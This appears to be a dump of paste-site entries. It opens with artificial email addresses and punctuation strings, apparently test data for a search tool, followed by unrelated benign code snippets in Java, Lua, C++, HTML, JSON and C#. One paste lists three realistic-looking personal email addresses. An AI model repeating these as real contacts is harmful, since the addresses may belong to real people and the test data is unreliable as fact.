Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
YH5s7Muc,Untitled,backparsnip,Bash,Tuesday 4th of July 2023 11:27:00 AM CDT,"frontpotatoroof
 
賽博
 
網絡安全
 
This is Jul 4 '23 testing 1727
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6e"
AL6LsXYP,Untitled,dolomite42,JavaScript,Tuesday 4th of July 2023 11:21:52 AM CDT,"theodore.croft@hiltonflowers.co.uk
darren.allsopp@greencastle.org.uk
kirstie.ambler@centiveesupport.com
 
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3"
63bcwNXj,Untitled,JackOUT,Java,Tuesday 4th of July 2023 11:13:52 AM CDT,"package games.coob.v1_19;

import games.coob.nmsinterface.HologramRegistry;
import games.coob.nmsinterface.NMSHologramI;
import lombok.Getter;
import lombok.NonNull;
import org.bukkit.Location;
import org.mineacademy.fo.settings.ConfigItems;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;

public abstract class HologramRegistry_v1_19 extends HologramRegistry {

	private static final String FOLDER = ""holograms"";

	private static final ConfigItems<HologramRegistry_v1_19> loadedFiles = ConfigItems.fromFolder(FOLDER, HologramRegistry_v1_19.class);

	@Getter
	private NMSHologram_v1_19 hologram;

	protected HologramRegistry_v1_19(String id) {
		super(id);
	}

	protected HologramRegistry_v1_19(String id, NMSHologramI hologram) {
		super(id, hologram);
	}

	@Override
	protected void onLoad() {
		if (this.hologram == null)
			this.hologram = this.get(""Hologram"", NMSHologram_v1_19.class); // todo find out why this is causing issues

		System.out.println(""hologram: "" + this.hologram);
		this.save();
	}

	@Override
	protected void onSave() {
		System.out.println(""saved hologram: "" + this.hologram);
		this.set(""Hologram"", this.hologram);
	}

	// -----------------------------------------------------------------
	// Static
	// -----------------------------------------------------------------

	public static void createHologram(@NonNull final String id, @NonNull final NMSHologram_v1_19 hologram) {
		loadedFiles.loadOrCreateItem(id, () -> new HologramRegistry_v1_19(id, hologram) {
		});
	}

	public static List<Location> getHologramLocations() {
		final List<Location> locations = new ArrayList<>();

		for (final HologramRegistry_v1_19 registry : getHolograms())
			locations.add(((NMSHologramI) registry.getHologram()).getLocation());

		return locations;
	}

	/**
	 * @return
	 * @see ConfigItems#getItems()
	 */
	public static List<? extends HologramRegistry_v1_19> getHolograms() {
		return loadedFiles.getItems();
	}

	/**
	 * @return
	 * @see ConfigItems#getItemNames()
	 */
	public static Set<String> getHologramIDs() {
		return loadedFiles.getItemNames();
	}

	//System.out.println(""create holo param: "" + hologram);
	//System.out.println(""createmethod"");

	/**
	 * @see ConfigItems#loadItems()
	 */
	public static void loadHolograms() {
		loadedFiles.loadItems();
	}

	public static void removeHologram(final String id) {
		loadedFiles.removeItemByName(id);
	}

	public static void removeHologram(final NMSHologramI hologram) {
		for (final HologramRegistry_v1_19 registry : getHolograms())
			if (registry.getHologram().equals(hologram))
				loadedFiles.removeItem(registry);
	}

	/**
	 * @see ConfigItems#isItemLoaded(String)
	 */
	public static boolean isHologramLoaded(final String id) {
		return loadedFiles.isItemLoaded(id);
	}

	/**
	 * @return
	 * @see ConfigItems#findItem(String)
	 */
	public static HologramRegistry_v1_19 findById(@NonNull final String id) {
		return loadedFiles.findItem(id);
	}
}
"
hktH4nfY,Lua ChatGPT,A_GUES,Lua,Tuesday 4th of July 2023 11:09:57 AM CDT,"-- Lua
http = require(""socket.http"")
json = require(""json"")
ltn12 = require(""ltn12"")
http.TIMEOUT = 5

local response_body = {}

-- Set up your OpenAI API credentials
local headers = {
  [""Content-Type""] = ""application/json"",
  [""Authorization""] = ""Bearer YOUR_API_KEY""
}

-- The data to send in the POST request
local data = {
  engine = ""text-davinci-003"",  -- Specify GPT-3.5 engine
  prompt = ""Once upon a time"",
  max_tokens = 100  -- Set the maximum number of tokens in the response
}

-- Convert the data to JSON
local json_data = json.encode(data)

-- Send the POST request
local response, status, headers_res = http.request {
  url = ""https://api.openai.com/v1/completions"",
  method = ""POST"",
  headers = headers,
  source = ltn12.source.string(json_data),
  sink = ltn12.sink.table(response_body)
}

-- Parse the response
local response_json = json.decode(table.concat(response_body))

-- Print the generated text
print(response_json[""choices""][1][""text""])"
uejApvEv,geometry pattern,kolychestiy,C++,Tuesday 4th of July 2023 11:08:55 AM CDT,"#include <bits/stdc++.h>
using namespace std;

const double eps = 1e-7;
double pi = acos(-1);

struct Point{
    double x = 0, y = 0;
    double angle;
    double len_2;
    double len;
    Point(double x, double y) : x(x), y(y) {
        angle = atan2(y, x);
        len_2 = x*x + y*y;
        len = sqrt(len_2);
    }
    Point() {}
    
    Point rationing() const {
        return *this / len;
    }

    Point operator / (double k) const {
        return Point(x / k, y / k);
    }

    Point rotate(double da){
        da += angle;
        return Point(len * cos(da), len * sin(da));
    }
};

bool operator < (const Point& p, const Point& q){
    return p.x < q.x - eps || p.x < q.x + eps && p.y < q.y;
}

Point operator * (double k, const Point& p){
    return Point(p.x * k, p.y * k);
}

Point operator - (const Point& p, const Point& q){
    return Point(p.x - q.x, p.y - q.y);
}

Point operator + (const Point& p, const Point& q){
    return Point(p.x + q.x, p.y + q.y);
}

istream& operator >> (istream& in, Point& p){
    double x, y;
    cin >> x >> y;
    p = Point(x, y);
    return in;
}

ostream& operator << (ostream& out, const Point& p){
    out << p.x << ' ' << p.y;
    return out;
}

double angle_between(const Point& p, const Point& q){
    double a = abs(p.angle - q.angle);
    return min(a, 2*pi - a);
}

double vect(const Point& p, const Point& q){
    return p.x*q.y - p.y*q.x;
}

double scal(const Point& p, const Point& q){
    return p.x*q.x + p.y*q.y;
}

double dst_2(const Point& p, const Point& q){
    double x = p.x - q.x;
    double y = p.y - q.y;
    return x*x + y*y;
}

double area2(vector<Point>& a){
    Point p;
    Point last = a.back();
    double s = 0;
    for (auto cur : a){
        s += vect(cur - p, last - p);
        last = cur;
    }
    return abs(s);
}

struct Line{
    double a, b, c;
    Point v;
    Line (double A, double B, double C) : a(A), b(B), c(C) {
        double len = Point(a, b).len;
        a /= len; b /= len; c /= len;

        if (a < 0 || a == 0 && b < 0){
            a *= -1; b *= -1; c *= -1;
        }

        v = Point(-b, a);
    }

    Line (const Point& p, const Point& q){
        a = p.y - q.y;
        b = q.x - p.x;
        c = -(p.x*a + p.y*b);
        *this = Line(a, b, c);
    }

    Line (){}

    double distance(const Point& p) const {
        return abs(a*p.x + b*p.y + c);
    }

    double vect(const Point& p) const {
        return a*p.x + b*p.y + c;
    }
};

istream& operator >> (istream& in, Line& l){
    double a, b, c;
    cin >> a >> b >> c;
    l = Line(a, b, c);
    return in;
}

ostream& operator << (ostream& out, const Line& l){
    out << l.a << ' ' << l.b << ' ' << l.c << endl;
    return out;
}

pair<int, Point> intersect(const Line& l, const Line& m){
    double z = l.a * m.b - l.b * m.a;
    if (z == 0){
        if (l.c == m.c){
            return {1, Point()};
        }
        return {-1, Point()};
    }

    double x = -(l.c * m.b - l.b * m.c) / z;
    double y = -(l.a * m.c - l.c * m.a) / z;
    return {0, Point(x, y)};
}

struct Beam {
    Line l;
    Point v;
    Point b;
    Beam (const Point& p, const Point& q) : b(p), v(q), l(p, q){}
    Beam (){}

    double distance(const Point& p) const {
        if (scal(v - b, p - b) < 0){
            return sqrt(dst_2(b, p));
        }
        return l.distance(p);
    }

    bool in_sector(const Point& p) const {
        return scal(v - b, p - b) > -eps;
    }
};

double distance(const Beam& a, const Beam& b){
    const auto& res = intersect(a.l, b.l);
    if (res.first == 0){
        const Point& p = res.second;
        // cout << p << endl;
        if (a.in_sector(p) && b.in_sector(p)){
            return 0;
        }
    }

    return min(a.distance(b.b), b.distance(a.b));
}

struct Segment {
    Point p, q;
    Beam b1, b2;
    Line l;
    Segment (Point p, Point q) : p(min(p, q)), q(max(p, q)), b1(p, q), b2(q, p), l(p, q) {}
    Segment () {}
    
    double distance(const Point& p) const {
        return max(b1.distance(p), b2.distance(p));
    }

    bool in_sector(const Point& p) const {
        return b1.in_sector(p) && b2.in_sector(p);
    }
};

istream& operator >> (istream& in, Segment& s){
    Point p, q;
    cin >> p >> q;
    s = Segment(p, q);
    return in;
}

double distance(const Segment& s, const Segment& t){
    const auto& res = intersect(s.l, t.l);
    if (res.first == 0){
        const Point& p = res.second;
        if (s.in_sector(p) && t.in_sector(p)){
            return 0;
        }
    }

    return min(
        min(s.distance(t.p), s.distance(t.q)),
        min(t.distance(s.p), t.distance(s.q))
    );
}

void solve(){



}

main(){

    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout.tie(0);

    cout << fixed << setprecision(10);

    freopen(""raydist.in"", ""r"", stdin);
    freopen(""raydist.out"", ""w"", stdout);

    solve();

}"
mtnYs74z,HTML + Javascript,MizunoBrasil,HTML,Tuesday 4th of July 2023 11:05:02 AM CDT,"<!DOCTYPE html>
<html>
<head>
	<meta charset=""UTF-8"">
	<title>Tabela de Nomes e E-mails</title>
	<style>
		table, th, td {
			border: 1px solid black;
			border-collapse: collapse;
			padding: 5px;
		}
		.arrow {
			cursor: pointer;
		}
	</style>
</head>
<body>
	<table id=""tabela"">
		<thead>
			<tr>
				<th>
					Nome 
					<span class=""arrow"" onclick=""ordenarNomes()"">▲</span>
				</th>
				<th>Email</th>
			</tr>
		</thead>
		<tbody>			
			<tr>
				<td>Maria</td>
				<td>maria@example.com</td>
			</tr>
			<tr>
				<td>Carlos</td>
				<td>carlos@example.com</td>
			</tr>
			<tr>
				<td>Ana</td>
				<td>ana@example.com</td>
			</tr>
			

			</tbody>
		</table>

		<script>
			var ordemCrescente = true; // Indica se a ordenação está em ordem crescente ou decrescente

			function ordenarNomes() {
				var tabela, linhas, i, x, y, trocar;
				tabela = document.getElementById(""tabela"");
				trocar = true;

				while (trocar) {
					trocar = false;
					linhas = tabela.rows;

					for (i = 1; i < (linhas.length - 1); i++) {
						x = linhas[i].getElementsByTagName(""td"")[0];
						y = linhas[i + 1].getElementsByTagName(""td"")[0];

						if (ordemCrescente) {
							if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
								linhas[i].parentNode.insertBefore(linhas[i + 1], linhas[i]);
								trocar = true;
								break;
							}
						} else {
							if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
								linhas[i].parentNode.insertBefore(linhas[i + 1], linhas[i]);
								trocar = true;
								break;
							}
						}
					}
				}

				// Altera a seta conforme a ordenação
				var seta = tabela.getElementsByTagName(""span"")[0];
				if (ordemCrescente) {
					seta.innerHTML = ""▼"";
					ordemCrescente = false;
				} else {
					seta.innerHTML = ""▲"";
					ordemCrescente = true;
				}
			}
		</script>
	</body>
	</html>"
eyW4tcjX,Untitled,staf02,C++,Tuesday 4th of July 2023 10:58:55 AM CDT,"#include <iostream>

template<int x, int y>
struct solution {
	static constexpr int value = solution<x - 1, y>::value + solution<x, y - 1>::value;
};

template<int x>
struct solution<x, 0> {
	static constexpr int value = 1;
};


template<int y>
struct solution<0, y> {
	static constexpr int value = 1;
};

struct solution<0, 0> {
	int value = 1;
};

int main() {
	static_assert(solution<1, 1>::value == 2);
	return 0;
}"
B2AvuU8k,Untitled,DobriyKrot,C++,Tuesday 4th of July 2023 10:56:32 AM CDT,"#include <algorithm>
#include <cctype>
#include <cmath>
#include <iostream>
#include <set>
#include <map>
#include <stack>
#include <string>
#include <sstream>
#include <unordered_map>
#include <vector>
#include <chrono>
#include <queue>

using namespace std;

#define mp make_pair

const int MAXN = 100000;
const int INF = 1e9 + 7;

int mn[MAXN * 4];
int mx[MAXN * 4];

void update(int ver, int tl, int tr, int idx, int val) {
    if (tr - tl == 1) {
        mn[ver] = val;
        mx[ver] = val;
        return;
    }
    int mid = (tl + tr) / 2;
    // В ans мы не обновляли детей, когда удаляли не листовую вершину.
    // Поэтому тут надо протолкнуть ниже информацию об удалении.
    if (mn[ver] == INF) {
        mn[ver * 2 + 1] = INF;
        mn[ver * 2 + 2] = INF;
        mx[ver * 2 + 1] = INF;
        mx[ver * 2 + 2] = INF;
    }
    if (idx < mid) {
        update(ver * 2 + 1, tl, mid, idx, val);
    } else {
        update(ver * 2 + 2, mid, tr, idx, val);
    }
    mn[ver] = min(mn[ver * 2 + 1], mn[ver * 2 + 2]);
    mx[ver] = max(mx[ver * 2 + 1], mx[ver * 2 + 2]);
}


int ans(int ver, int tl, int tr, int l, int r, int p) {
    if (tl >= r || tr <= l) {
        return 0;
    }
    if (tl + 1 == tr) {
        if (mn[ver] <= p) {
            mn[ver] = INF;
            mx[ver] = INF;
            return 1;
        }
        return 0;
    }
    // Если максимум на отрезке <= p, то можно удалить сразу всю вершину
    if (tl >= l && tr <= r && mx[ver] <= p) {
        mx[ver] = INF;
        mn[ver] = INF;
        return tr - tl;
    }
    int mid = (tl + tr) / 2;
    int lhs = 0, rhs = 0;
    if (mn[ver * 2 + 1] <= p) {
        lhs = ans(ver * 2 + 1, tl, mid, l, r, p);
    }
    if (mn[ver * 2 + 2] <= p) {
        rhs = ans(ver * 2 + 2, mid, tr, l, r, p);
    }
    mn[ver] = min(mn[ver * 2 + 1], mn[ver * 2 + 2]);
    mx[ver] = max(mx[ver * 2 + 1], mx[ver * 2 + 2]);
    return lhs + rhs;
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);

    int n, m;
    cin >> n >> m;
    fill(mn, mn + n * 4, INF);
    fill(mx, mx + n * 4, INF);
    for (int i = 0; i < m; ++i) {
        int t;
        cin >> t;
        if (t == 1) {
            int pos, val;
            cin >> pos >> val;
            update(0, 0, n, pos, val);
        } else {
            int l, r, p;
            cin >> l >> r >> p;
            cout << ans(0, 0, n, l, r, p) << '\n';
        }
    }
}"
G6WbRxRj,getShedue,tejmur,JSON,Tuesday 4th of July 2023 10:55:15 AM CDT,"{
  ""shedule"": [
    {
      ""start"": ""2023-07-04T14:00:00"",
      ""end"": ""2023-07-04T16:00:00""
    }
  ],
  ""events"": [
    {
      ""type"": ""заявка"",
      ""start"": ""2023-07-04T14:00:00"",
      ""end"": ""2023-07-04T16:00:00\"""",
      ""details"": {
        ""department"": ""Филиал"",
        ""place"": ""Кабинет"",
        ""start"": ""2023-07-04T14:00:00"",
        ""fio"": ""Иванов Иван Иванович"",
        ""birthday"": ""2023-07-04T14:00:00""
      }
    }
  ]
}"
2ihPzHRA,D&D Mapper Information,SenpaiJody,JSON,Tuesday 4th of July 2023 10:16:45 AM CDT,"{
  ""Layer1"" :{
    ""Test1"" : {
      ""name"": ""Test1"",
      ""latlng"" : [200,300],
      ""notes"" : ""This is test 1""
    },
    ""Test2"" : {
      ""name"" : ""Test2"",
      ""latlng"" : [10, 604],
      ""notes"" : ""This is test 2""
    },
    ""Test3"" : {
      ""name"" : ""Test3"",
      ""latlng"" : [400, 400],
      ""notes"" : ""This is test 3""
    }
  }
  
}"
AkzjMa5X,ImageSequencePlayer,noradninja,C#,Tuesday 4th of July 2023 10:08:38 AM CDT,"/*
To use this script, if your project doesn't already have a Resources folder, create one inside the root Assets folder in Unity. Then, make a folder in there to hold your image sequence.
Number your images Image000, Image001, etc. IT IS CRUCIAL TO START WITH 000- if you don't, you will have a single blank frame when the animation loops
Put the script on the object you want to play back the sequence.
Set the options according to the comments below to point Unity at your image sequence.
*/

using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;
public class SequencePlayer : MonoBehaviour {

     //A texture object that will output the animation  
    private Texture texture;  
    //With this Material object, a reference to the game object Material can be stored  
  	public RawImage rawImage;  
    //An integer to advance frames  
    private int frameCounter = 0;  
  
    //A string that holds the name of the folder which contains the image sequence  
    public string folderName;  
    //The name of the image sequence  
    public string imageSequenceName;  
    //The number of frames the animation has  
    public int numberOfFrames;  
	//Toggle animation looping
	public bool loop = true;
    //The base name of the files of the sequence  
	public float frameDelay = 0.05f;
   private string baseName;  
   private float lastCallTime;
  
    void Awake()  
    {  
        //Get a reference to the Material of the game object this script is attached to  
        this.rawImage = this.GetComponent<RawImage>();
        //With the folder name and the sequence name, get the full path of the images (without the numbers)  
        this.baseName = this.folderName + ""/"" + this.imageSequenceName;  
    }  
  
    void Start ()  
    {  
        //set the initial frame as the first texture. Load it from the first image on the folder  
        texture = (Texture)Resources.Load(baseName + ""000"", typeof(Texture));  
    }  
  
    void Update ()  
    {  
     
            if (loop == true){
                //Start the 'PlayLoop' method as a coroutine  
                StartCoroutine(""PlayLoop"", frameDelay);  
            }
            else if (loop == false){
                //Start the 'Play' method as a coroutine
                StartCoroutine(""Play"", frameDelay);
            }
            //Set the material's texture to the current value of the frameCounter variable  
            rawImage.texture = this.texture;  
        
    }  
  
    //The following methods return a IEnumerator so they can be yielded:  
    //A method to play the animation in a loop  
    IEnumerator PlayLoop(float delay)  
    {  
        //wait for the time defined at the delay parameter  
        yield return new WaitForSeconds(delay);    
  
        //advance one frame  
        frameCounter = (++frameCounter)%numberOfFrames;  
  
        //load the current frame  
        this.texture = (Texture)Resources.Load(baseName + frameCounter.ToString(""D3""), typeof(Texture));  
  
        //Stop this coroutine  
        StopCoroutine(""PlayLoop"");  
    }  
  
    //A method to play the animation just once  
    IEnumerator Play(float delay)  
    {  
        //wait for the time defined at the delay parameter  
        yield return new WaitForSeconds(delay);    
  
        //if it isn't the last frame  
        if(frameCounter < numberOfFrames)  
        {  
            //Advance one frame  
            ++frameCounter;  
  
            //load the current frame  
            this.texture = (Texture)Resources.Load(baseName + frameCounter.ToString(""D3""), typeof(Texture));  
        }  
  
        //Stop this coroutine  
        StopCoroutine(""Play"");  
    }  

}"
eJafZuUF,api-link,wewajans,JSON,Tuesday 4th of July 2023 10:06:16 AM CDT,"[
  {
    ""id"": ""5a38c72c"",
    ""text"": ""Главная"",
    ""link"": ""/""
  },
  {
    ""id"": ""8d2e91f6"",
    ""text"": ""К урокам"",
    ""link"": ""/learn""
  },
  {
    ""id"": ""f4a63b0d"",
    ""text"": ""Рейтинг"",
    ""link"": ""/rating""
  },
  {
    ""id"": ""c19b8509"",
    ""text"": ""Эфиры"",
    ""link"": ""/esters""
  },
  {
    ""id"": ""7e50c83f"",
    ""text"": ""Новости"",
    ""link"": ""/news""
  }
]"
wPSm8f4g,Untitled,vizucode,JSON,Tuesday 4th of July 2023 10:04:57 AM CDT,"[
    {
    	""product_code"": ""mole"",
        ""is_multi_package"": true,
        ""product_package"":[
            {
            	""package_code"": ""A"",
                ""package_id"": 1,
                ""denom_list"": [
                    {
                    	""denom"": 3,
                        ""pp_code"": ""e638e4d52618f35dc03d4d64b584c6c3""
                    }
                ]
            }
        ]
    }
]"
WDLzPFNV,Animated sprite sheet,noradninja,C#,Tuesday 4th of July 2023 10:04:10 AM CDT,"using UnityEngine;
using System.Collections;
using System.Collections.Generic;
 
public class AnimateSpriteSheet : MonoBehaviour
{
    public string textureString = ""_MainTex"";
    public int _columns = 2;                        // The number of columns of the texture
    public int _rows = 2;                           // The number of rows of the texture
    public Vector2 _scale = new Vector3(1f, 1f);    // Scale the texture. This must be a non-zero number. negative scale flips the image
    public Vector2 _offset = Vector2.zero;          // You can use this if you do not want the texture centered. (These are very small numbers .001)
    public Vector2 _buffer = Vector2.zero;          // You can use this to buffer frames to hide unwanted grid lines or artifacts
    public float _framesPerSecond = 10f;            // Frames per second that you want to texture to play at
    public bool _playOnce = false;                  // Enable this if you want the animation to only play one time
    public bool _disableUponCompletion = false;     // Enable this if you want the texture to disable the renderer when it is finished playing
    public bool _enableEvents = false;              // Enable this if you want to register an event that fires when the animation is finished playing
    public bool _playOnEnable = true;               // The animation will play when the object is enabled
    public bool _newMaterialInstance = false;       // Set this to true if you want to create a new material instance
 
    private int _index = 0;                         // Keeps track of the current frame 
    private Vector2 _textureSize = Vector2.zero;    // Keeps track of the texture scale 
    private Material _materialInstance = null;      // Material instance of the material we create (if needed)
    private bool _hasMaterialInstance = false;      // A flag so we know if we have a material instance we need to clean up (better than a null check i think)
    private bool _isPlaying = false;                // A flag to determine if the animation is currently playing
 
 
    public delegate void VoidEvent();               // The Event delegate
    private List<VoidEvent> _voidEventCallbackList; // A list of functions we need to call if events are enabled
 
    // Use this function to register your callback function with this script
    public void RegisterCallback(VoidEvent cbFunction)
    {
        // If events are enabled, add the callback function to the event list
        if (_enableEvents)
            _voidEventCallbackList.Add(cbFunction);
        else
            Debug.LogWarning(""AnimateTiledTexture: You are attempting to register a callback but the events of this object are not enabled!"");
    }
 
    // Use this function to unregister a callback function with this script
    public void UnRegisterCallback(VoidEvent cbFunction)
    {
        // If events are enabled, unregister the callback function from the event list
        if (_enableEvents)
            _voidEventCallbackList.Remove(cbFunction);
        else
            Debug.LogWarning(""AnimateTiledTexture: You are attempting to un-register a callback but the events of this object are not enabled!"");
    }
 
    public void Play()
    {
        // If the animation is playing, stop it
        if (_isPlaying)
        {
            StopCoroutine(""updateTiling"");
            _isPlaying = false;
        }
        // Make sure the renderer is enabled
        GetComponent<Renderer>().enabled = true;
 
        //Because of the way textures calculate the y value, we need to start at the max y value
        _index = _columns;
 
        // Start the update tiling coroutine
        StartCoroutine(updateTiling());
    }
 
    public void ChangeMaterial(Material newMaterial, bool newInstance = false)
    {
        if (newInstance)
        {
            // First check our material instance, if we already have a material instance
            // and we want to create a new one, we need to clean up the old one
            if (_hasMaterialInstance)
                Object.Destroy( GetComponent<Renderer>().sharedMaterial);
 
            // create the new material
            _materialInstance = new Material(newMaterial);
 
            // Assign it to the renderer
             GetComponent<Renderer>().sharedMaterial = _materialInstance;
 
            // Set the flag
            _hasMaterialInstance = true;
        }
        else // if we dont have create a new instance, just assign the texture
             GetComponent<Renderer>().sharedMaterial = newMaterial;        
 
        // We need to recalc the texture size (since different material = possible different texture)
        CalcTextureSize();
 
        // Assign the new texture size
         GetComponent<Renderer>().sharedMaterial.SetTextureScale(textureString, _textureSize);
    }
 
    private void Awake()
    {
        // Allocate memory for the events, if needed
        if (_enableEvents)
            _voidEventCallbackList = new List<VoidEvent>();
 
        //Create the material instance, if needed. else, just use this function to recalc the texture size
        ChangeMaterial( GetComponent<Renderer>().sharedMaterial, _newMaterialInstance);
    }
 
    private void OnDestroy()
    {
        // If we wanted new material instances, we need to destroy the material
        if (_hasMaterialInstance)
        {
            Object.Destroy( GetComponent<Renderer>().sharedMaterial);
            _hasMaterialInstance = false;
        }
    }
 
    // Handles all event triggers to callback functions
    private void HandleCallbacks(List<VoidEvent> cbList)
    {
        // For now simply loop through them all and call yet.
        for (int i = 0; i < cbList.Count; ++i)
            cbList[i]();
    }
 
    private void OnEnable()
    {
 
       CalcTextureSize();
 
        if (_playOnEnable)
            Play();
    }
 
    private void CalcTextureSize()
    {
        //set the tile size of the texture (in UV units), based on the rows and columns
        _textureSize = new Vector2(1f / _columns, 1f / _rows);
 
        // Add in the scale
        _textureSize.x = _textureSize.x / _scale.x;
        _textureSize.y = _textureSize.y / _scale.y;
 
        // Buffer some of the image out (removes gridlines and stufF)
        _textureSize -= _buffer;
    }
 
    // The main update function of this script
    private IEnumerator updateTiling()
    {
        _isPlaying = true;
 
        // This is the max number of frames
        int checkAgainst = (_rows * _columns);
 
        while (true)
        {
            // If we are at the last frame, we need to either loop or break out of the loop
            if (_index >= checkAgainst)
            {
                _index = 0;  // Reset the index
 
                // If we only want to play the texture one time
                if (_playOnce)
                {
                    if (checkAgainst == _columns)
                    {
                        // We are done with the coroutine. Fire the event, if needed
                        if(_enableEvents)
                            HandleCallbacks(_voidEventCallbackList);
 
                        if (_disableUponCompletion)
                            gameObject. GetComponent<Renderer>().enabled = false;
 
                        // turn off the isplaying flag
                        _isPlaying = false;
 
                        // Break out of the loop, we are finished
                        yield break;
                    }
                    else
                        checkAgainst = _columns;    // We need to loop through one more row
                }
 
            }
 
            // Apply the offset in order to move to the next frame
            ApplyOffset();
 
            //Increment the index
            _index++;
 
            // Wait a time before we move to the next frame. Note, this gives unexpected results on mobile devices
            yield return new WaitForSeconds(1f / _framesPerSecond);
        }        
    }
 
    private void ApplyOffset()
    {
